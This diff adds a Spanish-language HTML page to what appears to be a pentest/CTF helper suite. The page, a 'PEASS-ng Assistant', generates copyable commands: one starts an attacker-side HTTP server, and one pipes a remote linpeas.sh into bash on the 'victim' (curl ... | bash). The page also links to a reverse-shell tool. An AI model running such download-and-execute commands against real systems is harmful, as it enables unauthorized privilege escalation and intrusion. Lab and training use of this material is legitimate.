@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>0xFlag - PEASS-ng Assistant</title>
+
+    <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="../css/styles.css" rel="stylesheet" />
+</head>
+
+<body class="bg-dark text-light d-flex flex-column min-vh-100">
+
+    <!-- Navegación -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark border-bottom border-secondary">
+        <div class="container-fluid px-4 px-lg-5">
+            <a class="btn btn-outline-success btn-sm font-monospace me-3" href="../../../index.html">
+                <i class="bi bi-arrow-left"></i> Bibliotek
+            </a>
+
+            <a class="navbar-brand d-flex align-items-center" href="../index.html">
+                <img src="../assets/0xFlag_Logo.png" alt="Logo" width="40" height="auto" class="d-inline-block align-text-center me-2">
+                <span class="fw-bold font-monospace">0xFlag</span>
+            </a>
+
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav ms-auto mb-2 mb-lg-0 font-monospace" style="font-size: 0.95rem;">
+                    <li class="nav-item"><a class="nav-link" href="../index.html">Inicio</a></li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="navRecon" role="button" data-bs-toggle="dropdown">Reconocimiento</a>
+                        <ul class="dropdown-menu dropdown-menu-dark cyber-dropdown">
+                            <li><a class="dropdown-item" href="nmap.html">Generador Nmap</a></li>
+                            <li><a class="dropdown-item" href="discovery.html">Discovery</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="navExp" role="button" data-bs-toggle="dropdown">Explotación</a>
+                        <ul class="dropdown-menu dropdown-menu-dark cyber-dropdown">
+                            <li><a class="dropdown-item" href="reverse.html">Reverse Shell</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle active" href="#" id="navEsc" role="button" data-bs-toggle="dropdown">Escalada</a>
+                        <ul class="dropdown-menu dropdown-menu-dark cyber-dropdown">
+                            <li><a class="dropdown-item" href="tty.html">TTY Assistant</a></li>
+                            <li><a class="dropdown-item active" href="peass.html">PEASS-ng</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item border-start border-secondary ms-lg-2 ps-lg-2">
+                        <a class="nav-link" href="history.html"><i class="bi bi-clock-history"></i> Historial</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="settings.html"><i class="bi bi-gear-fill"></i> Config</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Contenido PEASS -->
+    <main class="container px-5 my-5 flex-grow-1">
+        <div class="text-center text-white mb-4">
+            <h1 class="fw-bolder font-monospace text-success">> PEASS-ng Assistant</h1>
+            <p class="text-white-50">Descarga y ejecución de LinPEAS y WinPEAS</p>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="card bg-secondary bg-opacity-25 text-white border-secondary mb-4">
+                    <div class="card-body p-4">
+                        <div class="row font-monospace mb-3">
+                            <div class="col-md-7">
+                                <label class="fw-bold mb-1">LHOST (Tu servidor HTTP):</label>
+                                <input type="text" id="peass_ip" class="form-control bg-dark text-white border-secondary" placeholder="Ej: 10.10.14.5">
+                            </div>
+                            <div class="col-md-5">
+                                <label class="fw-bold mb-1">HTTP Port:</label>
+                                <input type="number" id="peass_port" class="form-control bg-dark text-white border-secondary" value="8000">
+                            </div>
+                        </div>
+
+                        <div class="mb-3 font-monospace">
+                            <label class="fw-bold mb-1">Sistema Operativo Objetivo:</label>
+                            <select id="peass_os" class="form-select bg-dark text-white border-secondary">
+                                <option value="linpeas">Linux (linpeas.sh)</option>
+                                <option value="winpeas">Windows (winPEAS.ps1 / winPEAS.exe)</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Server Host Command -->
+                <div class="card bg-black border-success p-3 mb-3">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <span class="fw-bold text-success font-monospace">&gt; Servidor HTTP Local (Atacante):</span>
+                        <button class="btn btn-outline-success btn-sm btn-copy font-monospace" data-target="peass_srv_cmd">
+                            <i class="bi bi-clipboard"></i> Copiar
+                        </button>
+                    </div>
+                    <input type="text" id="peass_srv_cmd" readonly class="form-control bg-dark text-success border-0 font-monospace" value="python3 -m http.server 8000">
+                </div>
+
+                <!-- Target Execution Command -->
+                <div class="card bg-black border-success p-3">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <span class="fw-bold text-success font-monospace">&gt; Ejecución en Víctima:</span>
+                        <button class="btn btn-outline-success btn-sm btn-copy font-monospace" data-target="peass_exec_cmd">
+                            <i class="bi bi-clipboard"></i> Copiar
+                        </button>
+                    </div>
+                    <input type="text" id="peass_exec_cmd" readonly class="form-control bg-dark text-success border-0 font-monospace" value="curl -s http://10.10.14.5:8000/linpeas.sh | bash">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-dark border-top border-secondary text-white-50 text-center py-3 mt-auto font-monospace small">
+        © 2026 0xFlag - Bibliotek Suite
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../js/commands.js"></script>
+    <script src="../js/app.js"></script>
+</body>
+</html>
